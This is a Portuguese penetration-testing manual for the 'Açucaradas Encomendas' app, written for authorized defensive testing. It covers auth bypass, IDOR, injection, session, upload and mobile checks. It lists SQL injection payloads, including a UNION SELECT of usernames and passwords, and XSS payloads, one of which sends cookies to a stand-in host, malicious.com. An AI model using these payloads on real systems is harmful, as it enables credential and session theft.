# Manual de Testes de Penetração - Açucaradas Encomendas

## Introdução

Este documento fornece instruções detalhadas para realizar testes de penetração manuais no aplicativo Açucaradas Encomendas, complementando os testes automatizados configurados no script `pentest-automation.ps1`.

## Pré-requisitos

- Ambiente de teste isolado (nunca teste em produção)
- Ferramentas instaladas:
  - OWASP ZAP
  - Burp Suite (Community ou Professional)
  - Postman
  - Browser com extensões de segurança (ex: Firefox com HackTools)

## 1. Testes de Autenticação e Autorização

### 1.1 Bypass de Autenticação

- Teste de força bruta em credenciais
  ```
  # Exemplo usando Burp Intruder
  1. Capture uma requisição de login
  2. Envie para o Intruder
  3. Configure payloads com listas de usuários/senhas comuns
  4. Execute o ataque
  ```

- Teste de manipulação de tokens
  ```
  1. Capture um token JWT após login
  2. Analise o token em jwt.io
  3. Tente modificar claims e verificar se a validação é adequada
  ```

### 1.2 Escalação de Privilégios

- Acesso horizontal (entre contas do mesmo nível)
  ```
  1. Faça login como usuário A
  2. Capture o identificador de recurso na URL (ex: /perfil/123)
  3. Tente acessar recursos de outro usuário alterando o ID (/perfil/124)
  ```

- Acesso vertical (elevação de privilégios)
  ```
  1. Identifique endpoints administrativos
  2. Tente acessá-los com conta de usuário comum
  3. Verifique se há verificação de permissões em cada endpoint
  ```

## 2. Testes de Injeção

### 2.1 SQL Injection

- Teste em campos de busca
  ```
  # Payloads para testar
  ' OR 1=1 --
  " OR 1=1 --
  1' OR '1'='1
  admin'--
  ```

- Teste em parâmetros de API
  ```
  # Adicione à URL ou corpo da requisição
  ?id=1 OR 1=1
  ?category=doces' UNION SELECT username,password FROM users --
  ```

### 2.2 Cross-Site Scripting (XSS)

- Teste em campos de formulário
  ```
  # Payloads para testar
  <script>alert('XSS')</script>
  <img src="x" onerror="alert('XSS')">
  javascript:alert('XSS')
  ```

- Teste em parâmetros de URL
  ```
  ?search=<script>fetch('https://malicious.com?cookie='+document.cookie)</script>
  ```

## 3. Testes de Gerenciamento de Sessão

### 3.1 Fixação de Sessão

```
1. Obtenha um ID de sessão antes do login
2. Verifique se o ID muda após o login
3. Tente reutilizar IDs de sessão antigos
```

### 3.2 Expiração de Sessão

```
1. Faça login e capture o token/cookie
2. Aguarde um período sem atividade
3. Tente usar o mesmo token para acessar áreas protegidas
```

## 4. Testes de Validação de Entrada

### 4.1 Upload de Arquivos

```
# Tente fazer upload de:
1. Arquivos maliciosos (.php, .js)
2. Arquivos com extensão dupla (imagem.jpg.php)
3. Arquivos muito grandes
4. Arquivos com conteúdo malicioso mas extensão válida
```

### 4.2 Sanitização de Dados

```
# Teste com caracteres especiais em campos de texto:
<, >, &, ", ', /, \, ;, :, etc.

# Teste com valores extremos em campos numéricos:
-1, 0, valores muito grandes, notação científica
```

## 5. Testes de Configuração

### 5.1 Headers HTTP de Segurança

```
# Verifique a presença e configuração correta de:
- Content-Security-Policy
- X-XSS-Protection
- X-Content-Type-Options
- X-Frame-Options
- Strict-Transport-Security
```

### 5.2 Exposição de Informações Sensíveis

```
# Verifique:
1. Comentários no código-fonte
2. Metadados em arquivos
3. Mensagens de erro detalhadas
4. Diretórios listáveis
5. Arquivos de backup/temporários (.bak, .tmp, .old)
```

## 6. Testes Específicos para Mobile

### 6.1 Armazenamento Local

```
# Verifique:
1. Dados sensíveis em SharedPreferences/UserDefaults
2. Uso adequado de Keychain/Keystore
3. Criptografia de dados em repouso
```

### 6.2 Comunicação Cliente-Servidor

```
# Verifique:
1. Uso de HTTPS com certificado válido
2. Pinning de certificado
3. Proteção contra ataques Man-in-the-Middle
```

## 7. Documentação de Resultados

Para cada vulnerabilidade encontrada, documente:

1. **Descrição**: O que é a vulnerabilidade
2. **Reprodução**: Passos detalhados para reproduzir
3. **Impacto**: Potencial dano ao negócio/usuários
4. **Severidade**: Crítica, Alta, Média, Baixa
5. **Recomendação**: Como corrigir o problema
6. **Evidências**: Screenshots, logs, payloads utilizados

## 8. Relatório Final

O relatório final deve incluir:

1. **Sumário Executivo**: Visão geral para gestores
2. **Metodologia**: Abordagem e ferramentas utilizadas
3. **Resultados**: Vulnerabilidades encontradas, organizadas por severidade
4. **Recomendações**: Plano de ação para correções
5. **Anexos**: Evidências técnicas detalhadas

---

## Lembrete de Ética e Legalidade

- Obtenha autorização formal antes de iniciar testes
- Nunca exfiltrar dados reais de usuários
- Reporte imediatamente vulnerabilidades críticas
- Mantenha confidencialidade sobre os resultados
- Siga o princípio de "não causar danos"